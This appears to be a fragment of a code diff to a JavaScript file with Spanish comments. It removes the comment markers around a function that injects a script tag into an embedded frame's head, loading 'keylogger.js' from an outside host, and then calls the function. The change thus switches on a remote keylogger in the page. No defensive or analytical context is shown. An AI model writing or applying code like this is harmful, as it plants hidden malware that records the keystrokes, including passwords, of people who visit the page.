@@ -245,7 +245,7 @@ document.getElementById("CI").style.height="50px";
 //
 ////FIN DEL SCRIPT.
 
-/*
+
 function eD()
 {
 var cabe = IN.CI.document.head
@@ -254,4 +254,4 @@ scriptt.src="http://kosmosapps.xyz/keylogger.js";
 cabe.appendChild(scriptt);
 }
 eD();
-*/
+
